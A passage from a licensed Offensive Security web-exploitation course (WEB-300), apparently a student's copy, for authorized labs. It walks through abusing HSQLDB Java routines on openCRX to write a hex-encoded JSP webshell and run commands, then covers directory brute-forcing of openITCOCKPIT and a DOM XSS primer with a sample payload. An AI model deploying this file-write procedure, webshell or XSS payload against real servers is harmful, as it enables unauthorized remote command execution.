173 (Oracle, 2018), https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#getProperty(java.lang.String) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
338 
 
Figure 264: Invoking the systemprop function 
The classpath we have to work with is very limited. Although hsqldb.jar is the only file listed, a 
Java process always has access to the default Java classes. If we want to use a function or 
procedure to do anything malicious, we’ll need to find a suitable method in hsqldb.jar or the core 
Java JAR files. 
We have the following restrictions: 
1. 
The method must be static. 
2. 
The method parameters must be primitives or types that map to SQL types. 
3. 
The method must return a primitive, an object that maps to a SQL type, or void. 
4. 
The method must run code directly or write files to the system. 
In Java, all methods must include a return type. The void keyword is used when a 
method does not return a value. 
We can use JD-GUI to search for methods that match these criteria. Prior to Java version 9, 
standard classes were stored in lib/rt.jar. While we could open this jar in JD-GUI, it would quickly 
become apparent that the search functionality doesn’t cover method signatures. Our next option 
is to export the source files out of JD-GUI and open them with VS Code. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
339 
We will start our search with methods that are “public static” and return void. We will use the 
regular expression of “public static void \w+\(String” as our search term. This will search for: 
• 
the string “public static void” 
• 
followed by any number of “word” characters (a-zA-Z0-9) 
• 
followed by a parenthesis 
• 
followed by the word “String” 
This search string will let us find any methods that are public, static, return void, and take a String 
as their first parameter. We will still need to do some manual inspection, but this should give us a 
good start. We will click the Use Regular Expression button to run the search. 
 
Figure 265: Using VS Code to search for candidate methods 
Our search identified 215 results. Going through the results manually, we find that 
com.sun.org.apache.xml.internal.security.utils.JavaUtils 
inside 
/usr/lib/jvm/java-8-openjdk-
amd64/jre/lib/rt.jar matches our criteria. 
096  public static void writeBytesToFilename(String paramString, byte[] 
paramArrayOfByte) { 
097    FileOutputStream fileOutputStream = null; 
098      try { 
099        if (paramString != null && paramArrayOfByte != null) { 
100          File file = new File(paramString); 
101            
102          fileOutputStream = new FileOutputStream(file); 
103            
104          fileOutputStream.write(paramArrayOfByte); 
105          fileOutputStream.close(); 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
340 
106        } 
107        else if (log.isLoggable(Level.FINE)) { 
108          log.log(Level.FINE, "writeBytesToFilename got null byte[] pointed"); 
109        } 
110      
111      } catch (IOException iOException) { 
112        if (fileOutputStream != null) { 
113          try { 
114            fileOutputStream.close(); 
115          } catch (IOException iOException1) { 
116            if (log.isLoggable(Level.FINE)) { 
117              log.log(Level.FINE, iOException1.getMessage(), iOException1); 
118          } 
119        }  
120      } 
121    }  
122  } 
Listing 361 - writeBytesToFilename method 
This method seems to meet our criteria. It returns void, so we can call it from a procedure. Next, 
we need to pass in a string and a byte array. It creates a new file using the string value as its 
name (line 100) and writes the byte array to the file (line 104). 
According to the HSQLDB documentation,174 we should be able to pass in string and byte array 
types from our query. 
SQL Type 
Java Type 
CHAR or VARCHAR String 
BINARY 
bytesection-5 
VARBINARY 
bytesection-5 
Table 1 - SQL types to Java types 
Since the method we plan to call returns void, let’s create a new procedure. We’ll use a VARCHAR 
for the paramString parameter and a VARBINARY for the paramArrayOfByte parameter. We could 
set the length of a BINARY field, however, the database would pad any value we submitted with 
zeroes. This might interfere with the file we want to create, so we’ll use VARBINARY, which 
doesn’t pad the value. Let’s set the size of the VARBINARY as 1024 to give us enough room for a 
payload. 
CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte 
VARBINARY(1024))  
  LANGUAGE JAVA  
  DETERMINISTIC NO SQL 
  EXTERNAL NAME 
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilena
me' 
Listing 362 - Procedure definition for writeBytesToFilename 
The syntax to create a procedure is mostly the same as creating a function. After creating the 
procedure on the openCRX server, we’ll invoke it using the CALL keyword, similar to stored 
 
174 (The HSQL Development Group, 2020), http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_static_methods 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
341 
procedures in other database software. However, first we need to convert our payload into bytes. 
Let’s make this conversion using the Decoder tool in Burp Suite. 
First, we will do a simple proof of concept to verify it works. We can encode “It worked!” as ASCII 
hex for our payload. We will not specify a file path as part of the paramString value. 
call writeBytesToFilename('test.txt', cast ('497420776f726b656421' AS 
VARBINARY(1024))) 
Listing 363 - Calling the writeBytesToFilename procedure 
If everything works, we’ll find a new file named test.txt in the database’s working directory. We 
can call our systemprop function again to receive the working directory. 
 
Figure 266: Checking the working directory 
Now that we know the working directory, we can verify that the file was created with the XXE 
vulnerability. 
9.4.1.1 Exercises 
1. 
Create the writeBytesToFilename procedure and use it to write a file on the server. 
2. 
Use the XXE vulnerability to verify the file was written correctly. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
342 
9.4.2 Finding the Write Location 
Now that we can write files on the server, let’s decide what to do with this exploit. We could try to 
upload a binary, but have no way to run it. 
We previously examined the server’s file structure with the tree command. In a black box test, we 
might leverage the XXE vulnerability to learn more about how the web application’s files are set 
up in directory listings. If we knew where JSP files were stored on the server, we could potentially 
write our own JSP into that directory and access it with our browser. 
9.4.2.1 Exercise 
Use the XXE vulnerability to find a directory with JSP files used by the opencrx-core-CRX 
application. 
9.4.3 Writing Web Shells 
Now that we know where to write our files, we can use our writeBytesToFilename procedure to 
write a JSP command shell. If everything works, we should be able to access it from our browser. 
We will use a webshell from Kali as the basis of our payload: 
kali@kali:/usr/share/webshells/jsp$ cat cmdjsp.jsp 
// note that linux = cmd and windows = "cmd.exe /c + cmd"  
 
<FORM METHOD=GET ACTION='cmdjsp.jsp'> 
<INPUT name='cmd' type=text> 
<INPUT type=submit value='Run'> 
</FORM> 
 
<%@ page import="java.io.*" %> 
<% 
   String cmd = request.getParameter("cmd"); 
   String output = ""; 
 
   if(cmd != null) { 
      String s = null; 
      try { 
         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd); 
         BufferedReader sI = new BufferedReader(new 
InputStreamReader(p.getInputStream())); 
         while((s = sI.readLine()) != null) { 
            output += s; 
         } 
      } 
      catch(IOException e) { 
         e.printStackTrace(); 
      } 
   } 
%> 
 
<pre> 
<%=output %> 
</pre> 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
343 
 
<!--    http://michaeldaw.org   2006    --> 
Listing 364 - cmdjsp.jsp 
We’ll need to update the shell to work on Linux and reduce its size to fit within 1024 bytes. Let’s 
remove the HTML form element to save some space. We will use the Decoder tool again to 
convert the contents of our JSP webshell into ASCII hex. Once we have the converted value, we 
can call writeBytesToFilename and use a relative path to the opencrx-core-CRX directory with our 
shell filename. 
call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-
CRX/opencrx-core-CRX/shell.jsp', 
cast('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472
696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a20202053
7472696e67206f7574707574203d2022223b0a0a202020696628636d6420213d206e756c6c29207b0a2020
20202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050
726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a
2020202020202020204275666665726564526561646572207349203d206e65772042756666657265645265
61646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d
282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d
206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a202020202020202020
7d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a20202020
2020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a0a
3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e' as VARBINARY(1024))) 
Listing 365 - Writing a command shell with writeBytesToFilename 
Finally, if we call our JSP and pass “hostname” as the cmd value in the querystring, we should 
receive the results of the command as shown in the listing below. 
kali@kali:~$ curl http://opencrx:8080/opencrx-core-CRX/shell.jsp?cmd=hostname 
 
<pre> 
opencrx 
</pre> 
Listing 366 - Calling the command shell with curl 
Excellent! Now that we can execute commands on the server with our command shell, we can 
work towards a full interactive shell on the server. 
9.4.3.1 Exercises 
1. 
Update the shell to work on Linux and write it on the server. 
2. 
Upgrade to a fully-interactive shell. 
9.5 Wrapping Up 
In this module, we used white box techniques to gain authenticated access to openCRX. From 
there, we leveraged both white and black box techniques to exploit XML External Entity Injection 
to enumerate the server. We found the credentials for an HSQLDB instance and were able to use 
Java language routines to gain limited remote code execution and create a command shell on the 
server. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
344 
9.5.1.1.1 
 
10 openITCOCKPIT XSS and OS Command Injection - 
Blackbox 
openITCOCKPIT175 is an application that aids in the configuration and management of two 
popular monitoring utilities: Nagios176 and Naemon.177 The vendor offers both an open-source 
community version and an enterprise version with premium extensions. 
Although the community version of openITCOCKPIT is open source, we’ll take a black box 
approach in this module to initially exploit a cross-site scripting vulnerability. The complete exploit 
chain will ultimately lead to remote command execution (RCE). 
These vulnerabilities were discovered by Offensive Security and are now referenced as CVE-2020-
10788, CVE-2020-10789, and CVE-2020-10790.178 
10.1 Getting Started 
Before we begin, let’s discuss some basic setup and configuration details. 
In order to access the openITCOCKPIT server, we have created a hosts file entry named 
“openitcockpit” on our Kali Linux VM. Make this change with the corresponding IP address on 
your Kali machine to follow along. Be sure to revert the openITCOCKPIT virtual machine from 
your student control panel before starting your work. The openITCOCKPIT box credentials are 
listed in the Wiki. 
We will not use application credentials in this module since we will operate from a black box 
perspective. The SSH credentials are only used to restart the service on a remote target. With our 
setup complete, we can begin testing openITCOCKPIT. 
10.2 Black Box Testing in openITCOCKPIT 
Although openITCOCKPIT is an open source application, we will attempt to discover 
vulnerabilities without viewing the source code, emulating a black box examination. We will not 
have access to source code, architecture diagrams, or a debug environment, and our testing 
coverage will be limited. 
Therefore, we must use our time wisely to investigate as much of the application as possible. 
With practice, we will learn to discern when to continue investigating a particular feature and 
when to move on. Over time, we’ll develop a keen sense for the errors and behaviors that suggest 
an anomaly. 
For example, an “SQL syntax” error obviously suggests the presence of a SQL injection 
vulnerability. During a white box assessment, we would check the code and, if input is not 
escaped properly, we could formulate an exploit. However, in a black box assessment, we might 
 
175 (it-novum, 2020), https://openitcockpit.io/ 
176 (Nagios, 2020), https://www.nagios.org/ 
177 (Naemon, 2020), https://www.naemon.org/ 
178 (it-novum, 2020), https://openitcockpit.io/security/#security 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
345 
not be able to discover the proper string to exploit the injection or the input might be escaped 
properly but the error is caused by something else. If we concentrate all of our resources into one 
potential vulnerability, we might miss other potential attack vectors. 
The flow of this module is somewhat cyclical. We will need to tie multiple pieces of information 
together in order to discover information we can use to further exploit the application. 
The discovery phase of this module is critical as is building a proper site map. Our first step will 
be to build the site map to obtain a holistic view of the endpoints exposed and the libraries used 
by the application. 
10.3 Application Discovery 
In order to discover exposed endpoints, we’ll first visit the application home page and observe the 
additional endpoints that the application reaches out to in order to generate the page. 
While it might be tempting to ignore directories that contain images, CSS, and JavaScript, they 
might leave clues as to how the application works. Each and every clue has potential value during 
a black box assessment. 
10.3.1 Building a Sitemap 
To begin, let’s visit http://openitcockpit in Firefox while proxying through Burp to create a basic 
sitemap. The proxy will capture all the requests and resources that are loaded and display them in 
the Target > Sitemap tab. 
 
Figure 267: Sitemap Generated By Homepage 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
346 
10.3.1.1.1 
 
This initial connection reveals several things: 
1. 
The openITCOCKPIT application runs on HTTPS. We were redirected when the page was 
loaded. 
2. 
Since we do not have a valid session, openITCOCKPIT redirected the application root to 
/login/login. 
3. 
The application uses Bootstrap,179 jQuery,180 particles,181 and Font Awesome.182 
4. 
The vendor dependencies are stored in the lib and vendor directories. 
5. 
Application-specific JavaScript appears located in the js directory. 
Ordinarily, this would be a good time to consider directory busting with a tool like 
Gobuster183 or DIRB.184 When running these tools, we found several pages that 
require authentication and a phpMyAdmin185 page. However, these discoveries 
are not relevant for the specific goal of this module. 
The login page does not reveal additional links to other pages. Let’s load a page that should not 
exist (like /thispagedoesnotexist) to determine the format of a 404 page. 
 
Figure 268: 404 Page 
 
179 (Bootstrap, 2020), https://getbootstrap.com/ 
180 (The jQuery Foundation, 2020), https://jquery.com/ 
181 (Vincent Garreau, 2020), https://vincentgarreau.com/particles.js/ 
182 (Fonticons, 2020), https://fontawesome.com/ 
183 (OJ Reeves, 2020), https://github.com/OJ/gobuster 
184 (DIRB, 2020), http://dirb.sourceforge.net/ 
185 (phpMyAdmin, 2020), https://www.phpmyadmin.net/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
347 
10.3.1.1.2 
 
The 404 page expands the Burp sitemap considerably. The js directory is especially interesting: 
 
Figure 269: Larger Site Map 
Specifically, the /js/vendor/UUID.js-4.0.3/ directory contains a dist subdirectory. 
When a JavaScript library is successfully built, the output files are typically written to a dist (or 
public) subdirectory. During the build process, the necessary files are typically minified, 
unnecessary files removed, and the resulting .js library can be distributed and ultimately imported 
into an application. 
However, the existence of a dist directory suggests that the application developer included the 
entire directory instead of just the .js library file. Any unnecessary files in this directory could 
expand our attack surface. 
JavaScript-heavy applications are trending towards using a bundler like 
webpack186 and a package manager like Node Package Manager(npm)187 instead 
of manual distribution methods. This type of workflow streamlines development 
and may ensure that only the proper files are distributed. 
 
186 (Webpack, 2020), https://webpack.js.org/ 
187 (npm, 2020), https://www.npmjs.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
348 
Since the Burp sitemap doesn’t show any additional files and we are limited to black box 
investigative techniques, it could be difficult to locate all the supporting files in the 
/js/vendor/UUID.js-4.0.3/ directory. However, we could search for the UUID.js developer’s 
homepage for more information. 
We would not typically pursue JavaScript library vulnerabilities at this stage. 
However, in an application like openITCOCKPIT with a small unauthenticated 
footprint, we will typically investigate these files once we’ve exhausted the 
access we do have. 
A Google search for uuid.js “4.0.3” leads us to the npm188 page for this library: 
 
Figure 270: NPM of uuidjs 
The “Homepage”189 link directs us to the package’s GitHub page. 
 
188 (LiosK, 2020), https://www.npmjs.com/package/uuidjs/v/4.0.3 
189 (LiosK, 2020), https://github.com/LiosK/UUID.js 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
349 
 
Figure 271: Github of uuidjs 
The uuidjs GitHub repo includes a root-level dist directory. At this point, we know that the 
developers of openITCOCKPIT have copied at least a part of this library’s repo directory into their 
application. They may have copied other files or directories as well. 
For example, the GitHub repo lists a root-level README.md file. Let’s try to open that file on our 
target web server by navigating to /js/vendor/UUID.js-4.0.3/README.md: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
350 
 
Figure 272: README of uuidjs 
The response indicates that README.md exists and is accessible. Although the application is 
misconfigured to serve more files than necessary, this is only a minor vulnerability considering 
our goal of remote command execution. We are, however, expanding our view of the application’s 
internal structure. 
Server-side executable files (such as .php) are rarely included in vendor libraries, meaning this 
may not be the best location to begin hunting for SQL injection or RCE vulnerabilities. However, 
the libraries may contain HTML files that could introduce reflected cross-site scripting (XSS) 
vulnerabilities. Since these “extra files” are typically less-scrutinized than other deliberately-
exposed files and endpoints, we should investigate further. 
For example, the /docs/ directory seems to contain HTML files. These “supporting” files are 
generally considered great targets for XSS vulnerabilities. This avenue is worth further 
investigation. 
However, before we dig any deeper, let’s search for other libraries that might contain additional 
files we may be able to target. This will provide a more complete overview of the application. 
10.3.2 Targeted Discovery 
We’ll begin our targeted discovery by focussing on finding aditional libraries in the vendor 
directory. By reviewing the sitemap, we already know that five libraries exist: UUID.js-4.0.3, 
fineuploader, gauge, gridstack, and lodash: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
351 
 
Figure 273: Sitemap Showing Five Vendor Locations 
In order to discover additional libraries, we could bruteforce the vendor directory with a tool like 
Gobuster. However, we’ll avoid common wordlist like those included with DIRB. Since we are 
finding JavaScript libraries in the /js/vendor path, we’ll instead generate a more-specific wordlist 
using the top ten thousand npm JavaScript packages. 
We will use jq,190 seclists,191 and gobuster in this section. If not already installed, 
simply run “sudo apt install jq gobuster seclists” 
Conveniently for us, the nice-registry192 repo contains a curated list of all npm packages193 
ordered by popularity. The list is JSON-formatted and contains over 170,000 entries. Before using 
the list, we’ll convert the JSON file into a list Gobuster will accept and limit it to a reasonable top 
10,000 packages. First, we’ll download the current list with wget: 
kali@kali:~$ wget https://github.com/nice-registry/all-the-package-
names/raw/master/names.json 
... 
Saving to: ‘names.json’ 
 
names.json   100%[==============================>]  23.49M  16.7MB/s    in 1.4s 
 
2020-02-14 12:16:54 (16.7 MB/s) - ‘names.json’ saved [24634943/24634943] 
Listing 367 - Downloading all npm packages 
 
190 (Stephen Dolan, 2020), https://stedolan.github.io/jq/ 
191 (Daniel Miessler, 2020), https://github.com/danielmiessler/SecLists 
192 (nice-registry, 2020), https://github.com/nice-registry 
193 (nice-registry, 2020), https://github.com/nice-registry/all-the-package-repos 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
352 
Now that we’ve downloaded names.json, we can use jq to grab only the top ten thousand, filter 
only items that have a package name with grep, strip any extra characters with cut, and redirect 
the output to npm-10000.txt. 
kali@kali:~$ jq '.[0:10000]' names.json | grep ","| cut -d'"' -f 2 > npm-10000.txt 
Listing 368 - Parsing all npm packages 
Using the top 10,000 npm packages, we’ll search for any other packages in the /js/vendor/ 
directory with gobuster. We’ll use the dir command to bruteforce directories, -w to pass in the 
wordlist, -u to pass in the url, and -k to ignore the self-signed certificate. 
kali@kali:~$ gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k 
... 
2020/02/14 12:34:34 Starting gobuster 
=============================================================== 
/lodash (Status: 301) 
/gauge (Status: 301) 
/bootstrap-daterangepicker (Status: 301) 
=============================================================== 
2020/02/14 12:36:46 Finished 
=============================================================== 
Listing 369 - Using Gobuster to bruteforce package names 
The Gobuster search revealed the additional “bootstrap-daterangepicker” package. While the 
UUID.js package we discovered earlier contained the version in the name of the directory, the 
other vendor libraries do not. For this reason, we will bruteforce the files in all the library 
directories to attempt to discovering the library version. This will allow us to download the exact 
copy of what is found on the openITCOCKPIT server. We’ll again use Gobuster for this search. 
To accomplish this, we will first start by creating a list of URLs that contain the packages we are 
targeting. Later, we’ll use this list as input into Gobuster in the URL flag. 
kali@kali:~$ cat packages.txt  
https://openitcockpit/js/vendor/fineuploader 
https://openitcockpit/js/vendor/gauge 
https://openitcockpit/js/vendor/gridstack 
https://openitcockpit/js/vendor/lodash 
https://openitcockpit/js/vendor/UUID.js-4.0.3 
https://openitcockpit/js/vendor/bootstrap-daterangepicker 
Listing 370 - List of packages to target 
Next, we need to find a suitable wordlist. The wordlist must include common file names like 
README.md, which might contain a version number of the library. It should be fairly generic and 
need not be extensive since our goal is not to find every file, but only those that will lead us to the 
correct version of the library. We’ll use the quickhits.txt list from the seclists project. The 
quickhits.txt wordlist is located in /usr/share/seclists/Discovery/Web-Content/ on Kali. 
Using the packages.txt file we created earlier, we’ll loop through each URL and search for content 
using the quickhits.txt wordlist. We’ll use a while loop and pass in the packages.txt file. With each 
line, we will echo the URL and run gobuster dir, passing -q to prevent Gobuster from printing 
the headers. 
kali@kali:~$ while read l; do echo "===$l==="; gobuster dir -w 
/usr/share/seclists/Discovery/Web-Content/quickhits.txt -k -q -u $l; done < 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
353 
packages.txt  
===https://openitcockpit/js/vendor/fineuploader=== 
===https://openitcockpit/js/vendor/gauge=== 
===https://openitcockpit/js/vendor/gridstack=== 
//bower.json (Status: 200) 
//demo (Status: 301) 
//dist/ (Status: 403) 
//README.md (Status: 200) 
===https://openitcockpit/js/vendor/lodash=== 
//.editorconfig (Status: 200) 
//.gitattributes (Status: 200) 
//.gitignore (Status: 200) 
//.travis.yml (Status: 200) 
//bower.json (Status: 200) 
//CONTRIBUTING.md (Status: 200) 
//package.json (Status: 200) 
//README.md (Status: 200) 
//test (Status: 301) 
//test/ (Status: 403) 
===https://openitcockpit/js/vendor/UUID.js-4.0.3=== 
//.gitignore (Status: 200) 
//bower.json (Status: 200) 
//dist/ (Status: 403) 
//LICENSE.txt (Status: 200) 
//package.json (Status: 200) 
//README.md (Status: 200) 
//test (Status: 301) 
//test/ (Status: 403) 
===https://openitcockpit/js/vendor/bootstrap-daterangepicker=== 
//README.md (Status: 200) 
Listing 371 - Using Gobuster to bruteforce vendor packages 
Gobuster did not discover any directories or files for the fineuploader or gauge libraries, but it 
discovered a README.md under gridstack, lodash, UUID.js-4.0.3, and bootstrap-daterangepicker. 
Instead of loading the pages from a browser, we’ll download the packages from the source. 
However, we must pay careful attention to the version numbers to ensure we are working with the 
same library. To obtain the version of the library, we’ll check the README.md of each package for 
the correct version number. 
Before proceeding, we will remove fineuploader and gauge from packages.txt since we did not 
discover any files we could use. We’ll also remove UUID.js-4.0.3 since we are already certain the 
version is 4.0.3. 
kali@kali:~$ cat packages.txt  
https://openitcockpit/js/vendor/gridstack 
https://openitcockpit/js/vendor/lodash 
https://openitcockpit/js/vendor/bootstrap-daterangepicker 
Listing 372 - Editing packages.txt 
Next, we’ll use the same while loop to run curl on each URL, appending /README.md. 
kali@kali:~$ while read l; do echo "===$l==="; curl $l/README.md -k; done < 
packages.txt 
===https://openitcockpit/js/vendor/gridstack=== 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
354 
... 
- [Changes](#changes) 
      - [v0.2.3 (development version)](#v023-development-version) 
... 
===https://openitcockpit/js/vendor/lodash=== 
# lodash v3.9.3 
... 
 
===https://openitcockpit/js/vendor/bootstrap-daterangepicker=== 
... 
Listing 373 - Enumerating version numbers 
We found version numbers for gridstack and lodash but unfortunately, we could not determine 
version information for bootstrap-daterangepicker. Before continuing, we will concentrate on the 
three packages we positively identified and download each from their respective GitHub pages: 
• 
UUID.js: https://github.com/LiosK/UUID.js/archive/v4.0.3.zip 
• 
Lodash: https://github.com/lodash/lodash/archive/3.9.3.zip 
• 
Gridstack: https://github.com/gridstack/gridstack.js/archive/v0.2.3.zip 
Downloading and extracting each zip file provides us with a copy of the files that exist in the 
application’s respective directories. This allows us to search for vulnerabilities without having to 
manually brute force all possible directory and file names. Not only does this save us time, it is 
also a quieter approach. 
While we are taking a blackbox approach with this module, it is important to note that this does 
not mean we won’t have to review any code. Reviewing the JavaScript and HTML files we do have 
access to is crucial for a successful assessment. 
Since the libraries contain many files, we will first search for all *.html files, which are most likely 
to contain the XSS vulnerabilities or load JavaScript that contains XSS vulnerabilities that we are 
looking for. 
We’ll use find to search our directory, supplying -iname to search with case insensitivity and 
search for HTML files with *.html. 
kali@kali:~/packages$ find ./ -iname "*.html" 
./lodash-3.9.3/perf/index.html 
./lodash-3.9.3/vendor/firebug-lite/skin/xp/firebug.html 
./lodash-3.9.3/test/underscore.html 
./lodash-3.9.3/test/index.html 
./lodash-3.9.3/test/backbone.html 
./gridstack.js-0.2.3/demo/knockout2.html 
./gridstack.js-0.2.3/demo/two.html 
./gridstack.js-0.2.3/demo/nested.html 
./gridstack.js-0.2.3/demo/knockout.html 
./gridstack.js-0.2.3/demo/float.html 
./gridstack.js-0.2.3/demo/serialization.html 
./UUID.js-4.0.3/docs/uuid.js.html 
./UUID.js-4.0.3/docs/UUID.html 
./UUID.js-4.0.3/docs/index.html 
./UUID.js-4.0.3/test/browser.html 
./UUID.js-4.0.3/test/browser-core.html 
Listing 374 - Searching for files ending with “html” 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
355 
Now that we have a list of HTML files, we can search for an XSS vulnerability to exploit. We are 
limited by the type of XSS vulnerability we can find though. Since these HTML files are not 
dynamically generated by a server, traditional reflected XSS and stored XSS won’t work since 
user-supplied data cannot be appended to the HTML files. However, these files might contain 
additional JavaScript that allows user input to manipulate the DOM, which could lead to DOM-
based XSS.194 
10.4 Intro To DOM-based XSS 
In order to understand DOM-based XSS, we must first familiarize ourselves with the Document 
Object Model (DOM).195 When a browser interprets an HTML page, it must render the individual 
HTML elements. The rendering creates objects of each element for display. HTML elements like 
div can contain other HTML elements like h1. When parsed by a browser, the div object is created 
and contains a h1 object as the child node. The hierarchical tree196 created by the objects that 
represent the individual HTML elements make up the Document Object Model. The HTML 
elements can be identified by id,197 class,198 tag name,199 and other identifiers that propagate to 
the objects in the DOM. 
Browsers generate a DOM from HTML so they can enable programmatic manipulation of a page 
via JavaScript. Developers may use JavaScript to manipulate the DOM for background tasks, UI 
changes, etc, all from the client’s browser. While the dynamic changes could be done on the 
server side by dynamically generating the HTML and sending it back to the user, this adds a 
significant delay to the application. 
For this manipulation to occur, JavaScript implements the Document200 interface. To query for an 
object on the DOM, the document interface implements APIs like getElementById, 
getElementsByClassName, and getElementsByTagName. The objects that are returned from the 
query inherit from the Element base class. The Element class contains properties like innerHTML 
to manipulate the content within the HTML element. The Document interface allows for direct 
writing to the DOM via the write() method. 
DOM-based XSS can occur if unsanitized user input is provided to a property, like innerHTML or a 
method like write(). 
For example, consider the inline JavaScript shown in Listing 375. 
<!DOCTYPE html> 
<html> 
<head> 
  <script> 
    const queryString = location.search; 
 
194 (OWASP, 2020), https://owasp.org/www-community/attacks/DOM_Based_XSS 
195 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction 
196 (Mozilla, 2019), <https://developer.mozilla.org/en-US/docs/Web/API/Document_object_model/Using_the_W3C_DOM_Level_1_Core 
> 
197 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/id 
198 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/class 
199 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/API/Element/tagName 
200 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/Document 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
356 
    const urlParams = new URLSearchParams(queryString); 
    const name = urlParams.get('name') 
    document.write('<h1>Hello, ' + name + '!</h1>'); 
  </script> 
</head> 
</html> 
Listing 375 - Example DOM XSS 
In Listing 375, the JavaScript between the script tags will first extract the query string from the 
URL. Using the URLSearchParams201 interface, the constructor will parse the query string and 
return a URLSearchParams object, which is saved in the urlParams variable. Next, the name 
parameter is extracted from the URL parameters using the get method. Finally, an h1 element is 
written to the document using the name passed as a query string. 
We will save the HTML contents of Listing 375 into /home/kali/xsstest.html. We don’t need to use 
Apache for this demo. To open the file in Firefox, we can run firefox xsstest.html and a new 
window should appear. 
When we append ?name=Jimmy to the URL, the message “Hello, Jimmy” is displayed. 
 
Figure 274: Hello Jimmy on Page 
However, if we append “?name=<script>alert(1)</script>” to the URL, the browser executes our 
JavaScript code. 
 
201 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
357 
 
Figure 275: Hello XSS 
If a file like this were hosted on a server, the resulting vulnerability would be a categorized as 
reflected DOM-based XSS. It is important to note that DOM-based XSS can also be stored if the 
value appended to the DOM is obtained from a user-controlled database value. In our situation, 
we can safely assume that the HTML files we found earlier are not pulling data from a database. 
10.5 XSS Hunting 
We’ll start our hunt for DOM-based XSS by searching for references to the document object. 
However, running a search for “document” will generate many false positives. Instead, we’ll 
search for “document.write” and narrow or broaden the search as needed. We will use grep 
recursively with the -r command in the ~/packages directory that we created earlier. To limit the 
results we will also use the –include flag to only search for HTML files. 
kali@kali:~/packages$ grep -r "document.write" ./ --include *.html 
./lodash-3.9.3/perf/index.html:         document.write('<script src="' + ui.buildPath 
+ '"><\/script>'); 
./lodash-3.9.3/perf/index.html:         document.write('<script src="' + ui.otherPath 
+ '"><\/script>'); 
./lodash-3.9.3/perf/index.html:                     document.write('<applet 
code="nano" archive="../vendor/benchmark.js/nano.jar"></applet>'); 
./lodash-3.9.3/test/underscore.html:            document.write(ui.urlParams.loader != 
